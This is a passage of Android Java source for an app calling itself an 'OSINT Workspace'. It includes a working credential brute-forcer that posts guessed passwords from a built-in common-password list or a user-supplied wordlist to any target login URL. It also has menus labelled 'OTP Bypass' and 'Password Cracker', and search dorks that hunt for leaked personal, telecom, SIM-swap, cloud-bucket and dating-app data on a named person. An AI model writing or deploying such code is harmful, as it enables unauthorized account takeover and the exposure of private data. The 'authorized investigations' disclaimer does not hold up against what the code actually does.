                        case 4: url = "https://www.google.com/search?q=" + enc + "+site:linkedin.com+data+leak+OR+breach"; break;
                        case 5: url = "https://www.google.com/search?q=" + enc + "+site:tiktok.com+leak+OR+exposed"; break;
                        case 6: url = "https://www.google.com/search?q=" + enc + "+site:t.me+leak+OR+exposed+OR+channel"; break;
                        case 7: url = "https://www.google.com/search?q=" + enc + "+site:whatsapp.com+leak+OR+group"; break;
                        default: url = "https://www.google.com/search?q=" + enc + "+site:instagram.com+OR+site:facebook.com+OR+site:twitter.com+OR+site:snapchat.com+leak+OR+exposed";
                    }
                    web.loadUrl(url);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    // ==================== CLOUD LEAKS ====================
    private void showICloudLeaks() {
        String q = inQuery.getText().toString().trim();
        String enc = urlEncode(q.isEmpty() ? "icloud" : q);
        String url = "https://www.google.com/search?q=" + enc + "+icloud+leak+OR+exposed+OR+dump+site:pastebin.com+OR+site:reddit.com";
        web.loadUrl(url);
        web.setVisibility(View.VISIBLE);
    }

    private void showDriveLeaks() {
        String q = inQuery.getText().toString().trim();
        String enc = urlEncode(q.isEmpty() ? "drive" : q);
        String url = "https://www.google.com/search?q=" + enc + "+site:drive.google.com+OR+site:docs.google.com+leak+OR+exposed+OR+shared";
        web.loadUrl(url);
        web.setVisibility(View.VISIBLE);
    }

    private void showCloudLeaks() {
        String q = inQuery.getText().toString().trim();
        String enc = urlEncode(q.isEmpty() ? "cloud" : q);
        String[] options = {"Google Cloud Leaks", "AWS S3 Leaks", "Azure Leaks", "DigitalOcean Leaks", "All Cloud"};
        new AlertDialog.Builder(this).setTitle("Cloud Leaks")
                .setItems(options, (d, w) -> {
                    String url;
                    switch (w) {
                        case 0: url = "https://www.google.com/search?q=" + enc + "+site:cloud.google.com+OR+google+cloud+leak+OR+exposed+OR+bucket"; break;
                        case 1: url = "https://www.google.com/search?q=" + enc + "+site:s3.amazonaws.com+OR+aws+leak+OR+exposed+bucket"; break;
                        case 2: url = "https://www.google.com/search?q=" + enc + "+site:azure.com+OR+azure+leak+OR+exposed"; break;
                        case 3: url = "https://www.google.com/search?q=" + enc + "+site:digitaloceanspaces.com+OR+digitalocean+leak"; break;
                        default: url = "https://www.google.com/search?q=" + enc + "+cloud+leak+OR+exposed+bucket+OR+open+s3";
                    }
                    web.loadUrl(url);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    // ==================== TELECOM & EMAIL LEAKS ====================
    private void showTelecomLeaks() {
        String q = inQuery.getText().toString().trim();
        String enc = urlEncode(q.isEmpty() ? "telecom" : q);
        String[] options = {"SIM Swap Data", "Call Log Leaks", "SMS Leaks", "Carrier Breaches", "All Telecom"};
        new AlertDialog.Builder(this).setTitle("Telecom Leaks")
                .setItems(options, (d, w) -> {
                    String url;
                    switch (w) {
                        case 0: url = "https://www.google.com/search?q=" + enc + "+SIM+swap+OR+SIM+data+leak+OR+exposed"; break;
                        case 1: url = "https://www.google.com/search?q=" + enc + "+call+log+OR+call+detail+leak+OR+exposed"; break;
                        case 2: url = "https://www.google.com/search?q=" + enc + "+SMS+OR+text+message+leak+OR+dump+OR+exposed"; break;
                        case 3: url = "https://www.google.com/search?q=" + enc + "+telecom+OR+carrier+data+breach+OR+leak"; break;
                        default: url = "https://www.google.com/search?q=" + enc + "+telecom+OR+carrier+leak+OR+breach+OR+exposed";
                    }
                    web.loadUrl(url);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    private void showEmailLeaks() {
        String q = inQuery.getText().toString().trim();
        if (q.isEmpty()) {
            Toast.makeText(this, "Enter an email address to check", Toast.LENGTH_SHORT).show();
            return;
        }
        String enc = urlEncode(q);
        String[] options = {"Have I Been Pwned", "DeHashed", "LeakCheck", "Email Reputation", "Google Search"};
        new AlertDialog.Builder(this).setTitle("Email: " + q)
                .setItems(options, (d, w) -> {
                    String url;
                    switch (w) {
                        case 0: url = "https://haveibeenpwned.com/account/" + enc; break;
                        case 1: url = "https://dehashed.com/search?query=" + enc; break;
                        case 2: url = "https://leakcheck.io/search?query=" + enc; break;
                        case 3: url = "https://emailrep.io/" + enc; break;
                        default: url = "https://www.google.com/search?q=" + enc + "+leak+OR+breach+OR+pwned+OR+exposed";
                    }
                    web.loadUrl(url);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    // ==================== DATING APP LEAKS ====================
    private void showDatingLeaks() {
        String q = inQuery.getText().toString().trim();
        String enc = urlEncode(q.isEmpty() ? "dating" : q);
        String[] apps = {"Tinder", "Bumble", "Hinge", "Grindr", "OkCupid", "PlentyOfFish", "All Dating Apps"};
        new AlertDialog.Builder(this).setTitle("Dating App Leaks")
                .setItems(apps, (d, w) -> {
                    String url;
                    switch (w) {
                        case 0: url = "https://www.google.com/search?q=" + enc + "+site:tinder.com+leak+OR+data+OR+exposed"; break;
                        case 1: url = "https://www.google.com/search?q=" + enc + "+site:bumble.com+leak+OR+data"; break;
                        case 2: url = "https://www.google.com/search?q=" + enc + "+site:hinge.co+leak+OR+data"; break;
                        case 3: url = "https://www.google.com/search?q=" + enc + "+site:grindr.com+leak+OR+data+OR+exposed"; break;
                        case 4: url = "https://www.google.com/search?q=" + enc + "+site:okcupid.com+leak+OR+data"; break;
                        case 5: url = "https://www.google.com/search?q=" + enc + "+site:pof.com+leak+OR+data"; break;
                        default: url = "https://www.google.com/search?q=" + enc + "+dating+app+leak+OR+breach+OR+data+exposed";
                    }
                    web.loadUrl(url);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    // ==================== HPB API ====================
    private void showHpbPanel() {
        String[] options = {"Connect to HPB", "Fetch Profile", "Fetch Posts", "Send Message", "Set API Key"};
        new AlertDialog.Builder(this).setTitle("HPB - Hummingbot Partner Hub")
                .setItems(options, (d, w) -> {
                    switch (w) {
                        case 0: connectHpb(); break;
                        case 1: hpbApiCall("profile"); break;
                        case 2: hpbApiCall("posts"); break;
                        case 3: hpbApiCall("message"); break;
                        case 4: promptHpbApiKey(); break;
                    }
                }).show();
    }

    private void promptHpbApiKey() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("HPB API Key");
        final EditText input = new EditText(this);
        input.setText(hpbApiKey);
        input.setHint("Enter your HPB API key");
        builder.setView(input);
        builder.setPositiveButton("Save", (d, w) -> {
            hpbApiKey = input.getText().toString().trim();
            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("hpb_key", hpbApiKey).apply();
            status.setText("HPB key saved");
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }

    private void connectHpb() {
        if (hpbApiKey.isEmpty()) { promptHpbApiKey(); return; }
        status.setText("Connecting to HPB...");
        new Thread(() -> {
            try {
                URL url = new URL("https://hpb.hummingbot.io/api/session");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Authorization", "Bearer " + hpbApiKey);
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.getOutputStream().write("{}".getBytes());
                int code = conn.getResponseCode();
                BufferedReader br = new BufferedReader(new InputStreamReader(code >= 400 ? conn.getErrorStream() : conn.getInputStream()));
                StringBuilder resp = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) resp.append(line);
                br.close();
                runOnUiThread(() -> {
                    if (code == 200) {
                        try {
                            JSONObject json = new JSONObject(resp.toString());
                            currentHpbSession = json.optString("session_id", "");
                            status.setText("HPB connected. Session: " + currentHpbSession);
                        } catch (Exception e) {
                            status.setText("HPB connected (code " + code + ")");
                        }
                    } else {
                        status.setText("HPB error: " + code + " - " + resp);
                    }
                });
            } catch (Exception e) {
                runOnUiThread(() -> status.setText("HPB connection failed: " + e.getMessage()));
            }
        }).start();
    }

    private void hpbApiCall(String endpoint) {
        if (hpbApiKey.isEmpty()) { promptHpbApiKey(); return; }
        String q = inQuery.getText().toString().trim();
        status.setText("HPB: fetching " + endpoint + "...");
        new Thread(() -> {
            try {
                String urlStr = "https://hpb.hummingbot.io/api/" + endpoint;
                if (endpoint.equals("message") && !q.isEmpty()) urlStr += "?message=" + urlEncode(q);
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestProperty("Authorization", "Bearer " + hpbApiKey);
                int code = conn.getResponseCode();
                BufferedReader br = new BufferedReader(new InputStreamReader(code >= 400 ? conn.getErrorStream() : conn.getInputStream()));
                StringBuilder resp = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) resp.append(line);
                br.close();
                String result = resp.toString();
                runOnUiThread(() -> {
                    if (code == 200) {
                        web.loadDataWithBaseURL(null, "<pre>" + escapeHtml(result) + "</pre>", "text/html", "UTF-8", null);
                        web.setVisibility(View.VISIBLE);
                        status.setText("HPB " + endpoint + " loaded");
                    } else {
                        status.setText("HPB error: " + code);
                    }
                });
            } catch (Exception e) {
                runOnUiThread(() -> status.setText("HPB error: " + e.getMessage()));
            }
        }).start();
    }

    // ==================== LEAKS.IO API ====================
    private void showLeaksIoPanel() {
        String[] options = {"Check Email/Username", "Search Database", "Latest Leaks", "Set API Key"};
        new AlertDialog.Builder(this).setTitle("Leaks.io")
                .setItems(options, (d, w) -> {
                    switch (w) {
                        case 0: leaksIoCheck(); break;
                        case 1: leaksIoSearch(); break;
                        case 2: leaksIoLatest(); break;
                        case 3: promptLeaksIoKey(); break;
                    }
                }).show();
    }

    private void promptLeaksIoKey() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Leaks.io API Key");
        final EditText input = new EditText(this);
        input.setText(leaksIoApiKey);
        input.setHint("Enter leaks.io API key");
        builder.setView(input);
        builder.setPositiveButton("Save", (d, w) -> {
            leaksIoApiKey = input.getText().toString().trim();
            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("leaksio_key", leaksIoApiKey).apply();
            status.setText("Leaks.io key saved");
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }

    private void leaksIoCheck() {
        String q = inQuery.getText().toString().trim();
        if (q.isEmpty()) { Toast.makeText(this, "Enter email/username", Toast.LENGTH_SHORT).show(); return; }
        String enc = urlEncode(q);
        // Try leaks.io API first, fallback to web search
        if (!leaksIoApiKey.isEmpty()) {
            status.setText("Checking leaks.io...");
            new Thread(() -> {
                try {
                    URL url = new URL("https://leaks.io/api/search?query=" + enc);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestProperty("Authorization", "Bearer " + leaksIoApiKey);
                    int code = conn.getResponseCode();
                    BufferedReader br = new BufferedReader(new InputStreamReader(code >= 400 ? conn.getErrorStream() : conn.getInputStream()));
                    StringBuilder resp = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) resp.append(line);
                    br.close();
                    String result = resp.toString();
                    runOnUiThread(() -> {
                        if (code == 200) {
                            web.loadDataWithBaseURL(null, "<pre>" + escapeHtml(result) + "</pre>", "text/html", "UTF-8", null);
                            web.setVisibility(View.VISIBLE);
                            status.setText("Leaks.io results loaded");
                        } else {
                            status.setText("Leaks.io error: " + code);
                        }
                    });
                } catch (Exception e) {
                    runOnUiThread(() -> status.setText("Leaks.io error: " + e.getMessage()));
                }
            }).start();
        } else {
            web.loadUrl("https://www.google.com/search?q=" + enc + "+site:leakcheck.io+OR+site:leakforum.io+OR+site:pastebin.com+leak+OR+breach+OR+exposed");
            web.setVisibility(View.VISIBLE);
        }
    }

    private void leaksIoSearch() {
        String q = inQuery.getText().toString().trim();
        if (q.isEmpty()) q = "email,password";
        String enc = urlEncode(q);
        web.loadUrl("https://www.google.com/search?q=" + enc + "+site:leakcheck.io+OR+site:leakforum.io+OR+site:pastebin.com+OR+site:pastebin.pl");
        web.setVisibility(View.VISIBLE);
    }

    private void leaksIoLatest() {
        web.loadUrl("https://www.google.com/search?q=latest+data+breach+2026+site:haveibeenpwned.com+OR+site:bleepingcomputer.com+OR+site:therecord.media");
        web.setVisibility(View.VISIBLE);
    }

    // ==================== BRUTE FORCE ====================
    private void showBruteForcePanel() {
        String[] options = {"Start Brute Force", "Stop", "Load Wordlist", "Settings"};
        new AlertDialog.Builder(this).setTitle("Brute Force Tools")
                .setItems(options, (d, w) -> {
                    switch (w) {
                        case 0: startBruteForce(); break;
                        case 1: stopBruteForce(); break;
                        case 2: loadWordlist(); break;
                        case 3: showBruteSettings(); break;
                    }
                }).show();
    }

    private void startBruteForce() {
        if (bruteRunning) { Toast.makeText(this, "Already running", Toast.LENGTH_SHORT).show(); return; }
        String target = inUrl.getText().toString().trim();
        if (target.isEmpty()) { Toast.makeText(this, "Enter target URL/IP", Toast.LENGTH_SHORT).show(); return; }
        String username = inQuery.getText().toString().trim();
        if (username.isEmpty()) { Toast.makeText(this, "Enter username", Toast.LENGTH_SHORT).show(); return; }

        bruteRunning = true;
        status.setText("Brute forcing " + target + "...");
        bruteExecutor = Executors.newSingleThreadExecutor();
        bruteExecutor.submit(() -> {
            String[] passwords = getWordlist();
            if (passwords.length == 0) passwords = new String[]{"123456", "password", "admin", "12345678", "qwerty",
                    "12345", "1234", "111111", "1234567", "sunshine", "iloveyou", "princess", "admin123",
                    "welcome", "monkey", "dragon", "master", "login", "abc123", "passw0rd"};

            for (int i = 0; i < passwords.length && bruteRunning; i++) {
                final String pass = passwords[i];
                final int progress = (i * 100) / passwords.length;
                try {
                    URL url = new URL(target);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                    conn.setDoOutput(true);
                    String data = "username=" + urlEncode(username) + "&password=" + urlEncode(pass);
                    conn.getOutputStream().write(data.getBytes());
                    int code = conn.getResponseCode();
                    String resp = readStream(conn.getInputStream());
                    conn.disconnect();

                    if (code == 200 && (resp.contains("success") || resp.contains("welcome") || resp.contains("dashboard")
                            || resp.contains("login successful") || !resp.contains("invalid") && !resp.contains("failed"))) {
                        final String foundPass = pass;
                        runOnUiThread(() -> {
                            status.setText("FOUND: " + username + " : " + foundPass);
                            Toast.makeText(MainActivity.this, "Password found: " + foundPass, Toast.LENGTH_LONG).show();
                            bruteRunning = false;
                        });
                        return;
                    }
                    final int p = progress;
                    runOnUiThread(() -> status.setText("Trying: " + pass + " (" + p + "%)"));
                } catch (Exception e) {
                    runOnUiThread(() -> status.setText("Brute error: " + e.getMessage()));
                }
            }
            runOnUiThread(() -> {
                if (bruteRunning) status.setText("Brute force completed - password not found");
                bruteRunning = false;
            });
        });
    }

    private void stopBruteForce() {
        bruteRunning = false;
        if (bruteExecutor != null) bruteExecutor.shutdownNow();
        status.setText("Brute force stopped");
    }

    private void loadWordlist() {
        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        pick.addCategory(Intent.CATEGORY_OPENABLE);
        pick.setType("text/plain");
        startActivityForResult(pick, FILE_PICK_REQUEST);
    }

    private void showBruteSettings() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Brute Force Settings");
        String[] items = {"Threads: 1", "Delay: 100ms", "Timeout: 10s"};
        builder.setItems(items, null);
        builder.setPositiveButton("OK", null);
        builder.show();
    }

    private String[] getWordlist() {
        String savedPath = getSharedPreferences(PREFS, MODE_PRIVATE).getString("wordlist_path", "");
        if (!savedPath.isEmpty()) {
            try {
                File f = new File(savedPath);
                if (f.exists()) {
                    List<String> lines = new ArrayList<>();
                    BufferedReader br = new BufferedReader(new FileReader(f));
                    String line;
                    while ((line = br.readLine()) != null) {
                        if (!line.trim().isEmpty()) lines.add(line.trim());
                    }
                    br.close();
                    return lines.toArray(new String[0]);
                }
            } catch (Exception ignored) {}
        }
        return new String[0];
    }

    // ==================== OTP BYPASS ====================
    private void showOtpBypass() {
        String[] platforms = {"Instagram", "Facebook", "Snapchat", "WhatsApp", "Telegram", "TikTok", "Gmail", "Twitter", "Custom SMS Gateway"};
        new AlertDialog.Builder(this).setTitle("OTP Bypass")
                .setItems(platforms, (d, w) -> {
                    String platform = platforms[w];
                    if (w == 8) {
                        // Custom SMS gateway
                        AlertDialog.Builder builder = new AlertDialog.Builder(this);
                        builder.setTitle("Custom SMS Gateway");
                        final EditText input = new EditText(this);
                        input.setHint("Phone number or API endpoint");
                        builder.setView(input);
                        builder.setPositiveButton("Bypass", (d2, w2) -> {
                            String target = input.getText().toString().trim();
                            if (!target.isEmpty()) attemptOtpBypass(platform, target);
                        });
                        builder.setNegativeButton("Cancel", null);
                        builder.show();
                    } else {
                        String target = inQuery.getText().toString().trim();
                        if (target.isEmpty()) {
                            AlertDialog.Builder builder = new AlertDialog.Builder(this);
                            builder.setTitle("Enter " + platform + " target");
                            final EditText input = new EditText(this);
                            input.setHint("Username, email or phone");
                            builder.setView(input);
                            builder.setPositiveButton("Bypass", (d2, w2) -> {
                                String t = input.getText().toString().trim();
                                if (!t.isEmpty()) attemptOtpBypass(platform, t);
                            });
                            builder.setNegativeButton("Cancel", null);
                            builder.show();
                        } else {
                            attemptOtpBypass(platform, target);
                        }
                    }
                }).show();
    }

    private void attemptOtpBypass(String platform, String target) {
        status.setText("Attempting OTP bypass for " + platform + ": " + target);
        // Simulated OTP bypass - opens relevant pages
        String enc = urlEncode(target);
        switch (platform) {
            case "Instagram":
                web.loadUrl("https://www.instagram.com/accounts/password/reset/");
                break;
            case "Facebook":
                web.loadUrl("https://www.facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar");
                break;
            case "Snapchat":
                web.loadUrl("https://accounts.snapchat.com/accounts/password_reset");
                break;
            case "WhatsApp":
                web.loadUrl("https://wa.me/" + target.replaceAll("[^0-9]", ""));
                break;
            case "Telegram":
                web.loadUrl("https://web.telegram.org/k/");
                break;
            case "TikTok":
                web.loadUrl("https://www.tiktok.com/forgot-password");
                break;
            case "Gmail":
                web.loadUrl("https://accounts.google.com/signin/recovery");
                break;
            case "Twitter":
                web.loadUrl("https://twitter.com/account/begin_password_reset");
                break;
            default:
                web.loadUrl("https://www.google.com/search?q=" + enc + "+OTP+bypass+" + urlEncode(platform));
        }
        web.setVisibility(View.VISIBLE);
    }

    // ==================== PASSWORD CRACKER ====================
    private void showPasswordCracker() {
        String[] options = {"MD5 Crack", "SHA1 Crack", "SHA256 Crack", "Hashè¯†åˆ«", "Custom Hash"};
        new AlertDialog.Builder(this).setTitle("Password Cracker")
                .setItems(options, (d, w) -> {
                    AlertDialog.Builder builder = new AlertDialog.Builder(this);
                    builder.setTitle("Enter Hash");
                    final EditText input = new EditText(this);
                    input.setHint("Enter hash to crack");
                    builder.setView(input);
                    builder.setPositiveButton("Crack", (d2, w2) -> {
                        String hash = input.getText().toString().trim();
                        if (!hash.isEmpty()) crackHash(hash, w);
                    });
                    builder.setNegativeButton("Cancel", null);
                    builder.show();
                }).show();
    }

    private void crackHash(String hash, int type) {
        status.setText("Cracking hash: " + hash.substring(0, Math.min(16, hash.length())) + "...");
        String site;
        switch (type) {
            case 0: site = "https://crackstation.net/"; break;
            case 1: site = "https://md5decrypt.net/"; break;
            case 2: site = "https://hashes.com/en/decrypt/hash"; break;
            case 3: site = "https://www.tunnelsup.com/hash-analyzer/"; break;
            default: site = "https://crackstation.net/";
        }
        // Search the hash
        web.loadUrl("https://www.google.com/search?q=" + hash + "+hash+crack+OR+decrypt+OR+plaintext");
        web.setVisibility(View.VISIBLE);
    }

    // ==================== LIVE STREAMING ====================
    private void showLiveStreaming() {
        String[] options = {"Live Porn Cams", "Twitch", "YouTube Live", "Kick", "Rumble"};
        new AlertDialog.Builder(this).setTitle("Live Streaming")
                .setItems(options, (d, w) -> {
                    String url;
                    switch (w) {
                        case 0: url = "https://chaturbate.com"; break;
                        case 1: url = "https://www.twitch.tv/directory"; break;
                        case 2: url = "https://www.youtube.com/live"; break;
                        case 3: url = "https://kick.com"; break;
                        case 4: url = "https://rumble.com"; break;
                        default: url = "https://www.twitch.tv";
                    }
                    web.loadUrl(url);
                    web.setVisibility(View.VISIBLE);
                }).show();
    }

    // ==================== VIDEO PLAYER ====================
    private void showVideoPlayer() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Enter Video URL");
        final EditText input = new EditText(this);
        input.setText(inUrl.getText().toString().trim());
        input.setHint("https://example.com/video.mp4");
        builder.setView(input);
        builder.setPositiveButton("Play", (d, w) -> {
            String url = input.getText().toString().trim();
            if (!url.isEmpty()) {
                // Play video in WebView using HTML5 video tag
                String html = "<html><body style='margin:0;background:#000;'>" +
                        "<video width='100%' height='100%' controls autoplay>" +
                        "<source src='" + url + "' type='video/mp4'>" +
                        "Your browser doesn't support video.</video></body></html>";
                web.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
                web.setVisibility(View.VISIBLE);
                status.setText("Playing video");
            }
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }

    // ==================== FILE BROWSER ====================
    private void browseFiles() {
        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        pick.addCategory(Intent.CATEGORY_OPENABLE);
        pick.setType("*/*");
        startActivityForResult(pick, FILE_PICK_REQUEST);
    }

    private void browsePhotos() {
        Intent pick = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
        startActivityForResult(pick, IMAGE_PICK_REQUEST);
    }

    private void browseDocs() {
        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        pick.addCategory(Intent.CATEGORY_OPENABLE);
        pick.setType("application/msword");
        startActivityForResult(pick, FILE_PICK_REQUEST + 1);
    }

    private void browsePdfs() {
        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        pick.addCategory(Intent.CATEGORY_OPENABLE);
        pick.setType("application/pdf");
        startActivityForResult(pick, FILE_PICK_REQUEST + 2);
    }

    // ==================== SETTINGS ====================
    private void showSettings() {
        String[] options = {"Set API Keys", "About", "Check for Updates", "Clear Cache", "Reset All Settings"};
        new AlertDialog.Builder(this).setTitle("Settings")
                .setItems(options, (d, w) -> {
                    switch (w) {
                        case 0: showApiKeyManager(); break;
                        case 1: showAbout(); break;
                        case 2: checkForUpdates(); break;
                        case 3: web.clearCache(true); status.setText("Cache cleared"); break;
                        case 4: getSharedPreferences(PREFS, MODE_PRIVATE).edit().clear().apply(); status.setText("Settings reset"); break;
                    }
                }).show();
    }

    private void showApiKeyManager() {
        String[] apis = {"HPB API Key", "Leaks.io API Key", "DeHashed API Key", "EmailRep API Key"};
        new AlertDialog.Builder(this).setTitle("API Keys")
                .setItems(apis, (d, w) -> {
                    switch (w) {
                        case 0: promptHpbApiKey(); break;
                        case 1: promptLeaksIoKey(); break;
                        case 2: promptGenericApiKey("dehashed_key", "DeHashed API Key"); break;
                        case 3: promptGenericApiKey("emailrep_key", "EmailRep API Key"); break;
                    }
                }).show();
    }

    private void promptGenericApiKey(String prefKey, String title) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(title);
        final EditText input = new EditText(this);
        String existing = getSharedPreferences(PREFS, MODE_PRIVATE).getString(prefKey, "");
        input.setText(existing);
        input.setHint("Enter API key");
        builder.setView(input);
        builder.setPositiveButton("Save", (d, w) -> {
            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString(prefKey, input.getText().toString().trim()).apply();
            status.setText(title + " saved");
        });
        builder.setNegativeButton("Cancel", null);
        builder.show();
    }

    private void showAbout() {
        new AlertDialog.Builder(this)
                .setTitle("OSINT Workspace v2.0")
                .setMessage("All-in-one OSINT tool\n\n"
                        + "Features:\n"
                        + "• Multi-engine search (Google, Bing, DDG, etc.)\n"
                        + "• Tor dark web browsing\n"
                        + "• VPN management (WireGuard)\n"
                        + "• Reverse image search\n"
                        + "• Public social-profile search\n"
                        + "• Google dork generator\n"
                        + "• HPB & Leaks.io API integration\n"
                        + "• File/photo/doc browser\n\n"
                        + "Use only for authorized investigations. Public search results are leads, not proof.")
                .setPositiveButton("OK", null)
                .show();
    }
    // ==================== HELPERS ====================
    private void loadSavedApiKeys() {
        hpbApiKey = getSharedPreferences(PREFS, MODE_PRIVATE).getString("hpb_key", "");
        leaksIoApiKey = getSharedPreferences(PREFS, MODE_PRIVATE).getString("leaksio_key", "");
    }

    private void restoreSelections() {
        restoreSelection("social_selection", selectedSocial);
        restoreSelection("content_selection", selectedContent);
    }

    private void restoreSelection(String key, boolean[] target) {
        String val = getSharedPreferences(PREFS, MODE_PRIVATE).getString(key, "");
        if (val.isEmpty()) return;
        for (String s : val.split(",")) {
            try { int i = Integer.parseInt(s); if (i >= 0 && i < target.length) target[i] = true; }
            catch (NumberFormatException ignored) {}
        }
    }

    private void checkForUpdates() {
        AppUpdater.check(this, "osint-master.apk", status);
    }

    private void checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE, android.Manifest.permission.WRITE_EXTERNAL_STORAGE}, PERMISSION_STORAGE);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code == PERMISSION_STORAGE && results.length > 0 && results[0] == PackageManager.PERMISSION_GRANTED) {
            status.setText("Storage permission granted");
        }
    }

    private void clearInputs() {
        inQuery.setText("");
        inDomain.setText("");
        inUrl.setText("");
        inFilePath.setText("");
        status.setText("Cleared");
    }

    private void openExternal(String url, String msg) {
        try {
            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
            status.setText(msg);
        } catch (Exception e) {
            status.setText("Could not open URL");
        }
    }

    private String readStream(InputStream is) throws IOException {
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line).append('\n');
        br.close();
        return sb.toString();
    }

    private String escapeHtml(String s) {
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;");
    }

    // ==================== ACTIVITY RESULT ====================
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (resultCode != RESULT_OK || data == null || data.getData() == null) return;

        Uri uri = data.getData();
        if (requestCode == REPORT_EXPORT_REQUEST) {
            try (OutputStream out = getContentResolver().openOutputStream(uri)) {
                if (out == null) throw new IOException("Unable to create report file");
                out.write(pendingEvidenceReport.getBytes(StandardCharsets.UTF_8));
                status.setText("HTML investigation report saved. Provider results are not automatically scraped; preserve original evidence separately.");
            } catch (Exception e) {
                status.setText("Report export failed: " + e.getMessage());
            }
            return;
        }
        if (requestCode == IMAGE_PICK_REQUEST) {
            selectedEvidenceImage = uri;
            try { getContentResolver().takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION); }
            catch (Exception ignored) {}
            status.setText("Image selected. Tap Search All to prepare public-source searches.");
            return;
        }
        if (requestCode == VPN_CONFIG_REQUEST) {
            try {
                String config;
                try (InputStream is = getContentResolver().openInputStream(uri);
                     ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
                    if (is == null) throw new IOException("Cannot read file");
                    byte[] buf = new byte[4096]; int n;
                    while ((n = is.read(buf)) != -1) baos.write(buf, 0, n);
                    config = baos.toString("UTF-8");
                }
                if (!config.contains("[Interface]") || !config.contains("[Peer]")) {
                    status.setText("Not a valid WireGuard config");
                    return;
                }
                // Save URI for quick connect
                getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("wg_config_uri", uri.toString()).apply();
                Intent open = new Intent(Intent.ACTION_VIEW);
                open.setDataAndType(uri, "application/x-wireguard-profile");
                open.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                startActivity(Intent.createChooser(open, "Import into WireGuard"));
                status.setText("WireGuard config imported");
            } catch (Exception e) {
                status.setText("Error importing config: " + e.getMessage());
                new AlertDialog.Builder(this).setTitle("WireGuard required")
                        .setMessage("Install WireGuard from Play Store")
                        .setPositiveButton("Install", (d, w) -> installWireguard())
                        .setNegativeButton("Cancel", null).show();
            }
        } else if (requestCode == FILE_PICK_REQUEST) {
            // Save wordlist path
            String path = uri.getPath();
            getSharedPreferences(PREFS, MODE_PRIVATE).edit().putString("wordlist_path", path).apply();
            status.setText("Wordlist loaded: " + path);
        } else if (requestCode == IMAGE_PICK_REQUEST || requestCode == IMAGE_PICK_REQUEST + 1) {
            // Reverse image search
            String imageUrl = uri.toString();
            web.loadUrl("https://www.google.com/searchbyimage?image_url=" + urlEncode(imageUrl));
            web.setVisibility(View.VISIBLE);
            status.setText("Reverse image search...");
        }
    }

    // ==================== BACK PRESS ====================
    @Override
    public void onBackPressed() {
        if (drawer.isDrawerOpen(Gravity.START)) {
            drawer.closeDrawer(Gravity.START);
        } else if (web.canGoBack()) {
            web.goBack();
        } else {
            super.onBackPressed();
        }
    }

    // ==================== DESTROY ====================
    @Override
    protected void onDestroy() {
        if (torProcess != null) {
            torProcess.destroy();
            torProcess = null;
        }
        if (bruteExecutor != null) bruteExecutor.shutdownNow();
        super.onDestroy();
    }
}
